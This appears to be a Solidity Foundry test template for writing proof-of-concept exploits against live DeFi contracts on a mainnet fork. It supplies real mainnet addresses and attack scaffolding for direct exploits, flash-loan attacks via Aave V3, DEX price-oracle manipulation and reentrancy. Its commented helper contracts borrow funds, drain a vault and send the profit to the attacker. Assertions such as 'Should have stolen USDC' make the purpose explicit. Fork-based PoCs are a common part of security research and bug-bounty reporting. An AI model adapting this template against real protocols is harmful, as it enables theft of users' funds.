// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// =============================================================================
// UNIVERSAL POC TEMPLATE - Mainnet Fork Exploit
// =============================================================================
//
// This template is designed to work against LIVE DEPLOYED contracts by forking
// mainnet state. It covers the most common exploit patterns in DeFi.
//
// USAGE:
//   1. Copy this file into your Foundry project's test/ directory
//   2. Replace TARGET_CONTRACT, BLOCK_NUMBER, and interface definitions
//   3. Implement the attack logic in test_exploit()
//   4. Run: forge test --match-test test_exploit --fork-url $RPC_URL -vvv
//
// PATTERNS INCLUDED:
//   - Flash loan attack (Aave V3)
//   - Price oracle manipulation
//   - Reentrancy
//   - Access control bypass
//   - Sandwich attack
//   - Governance manipulation
//
// =============================================================================

import {Test, console2} from "forge-std/Test.sol";

// ============================================================
// COMMON DEFI INTERFACES (add/remove as needed)
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Aave V3 Flash Loan
interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// Uniswap V2
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
    function sync() external;
}

// Uniswap V3
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata) external returns (uint256);
}

// Chainlink
interface IAggregatorV3 {
    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt,
        uint256 updatedAt, uint80 answeredInRound
    );
}

// ============================================================
// TARGET CONTRACT INTERFACE (customize per target)
// ============================================================

interface ITarget {
    // Replace with the target contract's actual functions
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function balanceOf(address user) external view returns (uint256);
    // Add more functions as needed
}

// ============================================================
// WELL-KNOWN MAINNET ADDRESSES
// ============================================================

contract MainnetAddresses {
    // Tokens
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI  = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // Aave V3
    address constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Uniswap
    address constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address constant UNI_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant UNI_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    // Chainlink ETH/USD
    address constant ETH_USD_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
}

// ============================================================
// EXPLOIT TEST
// ============================================================

contract ExploitTest is Test, MainnetAddresses {

    // ---- CONFIGURATION (EDIT THESE) ----
    address constant TARGET = address(0); // <-- Target contract address
    uint256 constant FORK_BLOCK = 0;      // <-- Block number to fork at (0 = latest)
    // ------------------------------------

    ITarget target;
    address attacker;
    uint256 attackerKey;

    function setUp() public {
        // Fork mainnet
        string memory rpcUrl = vm.envString("ETH_RPC_URL");
        if (FORK_BLOCK > 0) {
            vm.createSelectFork(rpcUrl, FORK_BLOCK);
        } else {
            vm.createSelectFork(rpcUrl);
        }

        // Setup attacker account
        (attacker, attackerKey) = makeAddrAndKey("attacker");
        vm.deal(attacker, 100 ether);

        target = ITarget(TARGET);
    }

    // ================================================================
    // PATTERN 1: Simple Direct Exploit
    // ================================================================
    function test_exploit_direct() public {
        _logState("BEFORE");

        vm.startPrank(attacker);
        // ---- ATTACK STEPS HERE ----

        // Step 1: Setup (deposit, approve, etc.)
        // Step 2: Trigger vulnerability
        // Step 3: Extract profit

        vm.stopPrank();

        _logState("AFTER");

        // Assertions
        // assertGt(IERC20(USDC).balanceOf(attacker), 0, "Should have stolen USDC");
    }

    // ================================================================
    // PATTERN 2: Flash Loan Attack (Aave V3)
    // ================================================================
    // Uncomment and customize for flash loan exploits:
    //
    // function test_exploit_flashloan() public {
    //     _logState("BEFORE");
    //
    //     vm.startPrank(attacker);
    //
    //     // Deploy attack contract that implements IFlashLoanSimpleReceiver
    //     FlashLoanAttacker flashAttacker = new FlashLoanAttacker(
    //         TARGET,
    //         AAVE_V3_POOL
    //     );
    //
    //     // Trigger flash loan
    //     flashAttacker.attack();
    //
    //     vm.stopPrank();
    //
    //     _logState("AFTER");
    // }

    // ================================================================
    // PATTERN 3: Price Manipulation via DEX
    // ================================================================
    // Uncomment for oracle manipulation exploits:
    //
    // function test_exploit_oracle_manipulation() public {
    //     _logState("BEFORE");
    //
    //     vm.startPrank(attacker);
    //
    //     // Step 1: Acquire large token position (via flash loan or deal)
    //     deal(WETH, attacker, 10000 ether);
    //
    //     // Step 2: Manipulate price on DEX
    //     IERC20(WETH).approve(UNI_V2_ROUTER, type(uint256).max);
    //     address[] memory path = new address[](2);
    //     path[0] = WETH;
    //     path[1] = address(targetToken);
    //     IUniswapV2Router(UNI_V2_ROUTER).swapExactTokensForTokens(
    //         10000 ether, 0, path, attacker, block.timestamp
    //     );
    //
    //     // Step 3: Exploit manipulated price in target protocol
    //     // target.borrow(...);  // borrows at inflated collateral value
    //
    //     // Step 4: Reverse the price manipulation (optional, for profit calc)
    //
    //     vm.stopPrank();
    //
    //     _logState("AFTER");
    // }

    // ================================================================
    // PATTERN 4: Reentrancy
    // ================================================================
    // Uncomment for reentrancy exploits:
    //
    // function test_exploit_reentrancy() public {
    //     _logState("BEFORE");
    //
    //     vm.startPrank(attacker);
    //     ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(TARGET);
    //     reentrancyAttacker.attack{value: 1 ether}();
    //     reentrancyAttacker.withdrawLoot();
    //     vm.stopPrank();
    //
    //     _logState("AFTER");
    //     assertGt(attacker.balance, 100 ether, "Should have drained vault");
    // }

    // ================================================================
    // HELPER: Log relevant state
    // ================================================================
    function _logState(string memory label) internal view {
        console2.log("");
        console2.log(string.concat("=== ", label, " ==="));
        console2.log("Block number:", block.number);
        console2.log("Target ETH balance:", address(target).balance / 1e18, "ETH");
        console2.log("Attacker ETH balance:", attacker.balance / 1e18, "ETH");

        // Add token balances as needed:
        // console2.log("Target USDC:", IERC20(USDC).balanceOf(TARGET) / 1e6, "USDC");
        // console2.log("Attacker USDC:", IERC20(USDC).balanceOf(attacker) / 1e6, "USDC");

        console2.log("");
    }
}

// ============================================================
// ATTACK HELPER CONTRACTS (uncomment and customize as needed)
// ============================================================

// --- Flash Loan Attacker ---
// contract FlashLoanAttacker is IFlashLoanSimpleReceiver {
//     address public target;
//     address public pool;
//     address public owner;
//
//     constructor(address _target, address _pool) {
//         target = _target;
//         pool = _pool;
//         owner = msg.sender;
//     }
//
//     function attack() external {
//         // Borrow 1M USDC via flash loan
//         IPool(pool).flashLoanSimple(
//             address(this),
//             0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
//             1_000_000 * 1e6,
//             "",
//             0
//         );
//     }
//
//     function executeOperation(
//         address asset,
//         uint256 amount,
//         uint256 premium,
//         address initiator,
//         bytes calldata
//     ) external returns (bool) {
//         require(msg.sender == pool, "not pool");
//         require(initiator == address(this), "not initiator");
//
//         // ---- EXPLOIT LOGIC WITH BORROWED FUNDS ----
//
//         // Step 1: Use borrowed funds to exploit target
//         // IERC20(asset).approve(target, amount);
//         // ITarget(target).deposit(amount);
//         // ITarget(target).exploitFunction();
//         // ITarget(target).withdraw(...);
//
//         // ---- END EXPLOIT ----
//
//         // Repay flash loan (amount + premium)
//         uint256 repayAmount = amount + premium;
//         IERC20(asset).approve(pool, repayAmount);
//
//         // Send profit to owner
//         uint256 profit = IERC20(asset).balanceOf(address(this)) - repayAmount;
//         if (profit > 0) {
//             IERC20(asset).transfer(owner, profit);
//         }
//
//         return true;
//     }
// }

// --- Reentrancy Attacker ---
// contract ReentrancyAttacker {
//     address public target;
//     uint256 public count;
//     uint256 public maxReentries = 20;
//
//     constructor(address _target) {
//         target = _target;
//     }
//
//     function attack() external payable {
//         ITarget(target).deposit(msg.value);
//         ITarget(target).withdraw(msg.value);
//     }
//
//     receive() external payable {
//         if (target.balance >= 1 ether && count < maxReentries) {
//             count++;
//             ITarget(target).withdraw(1 ether);
//         }
//     }
//
//     function withdrawLoot() external {
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }
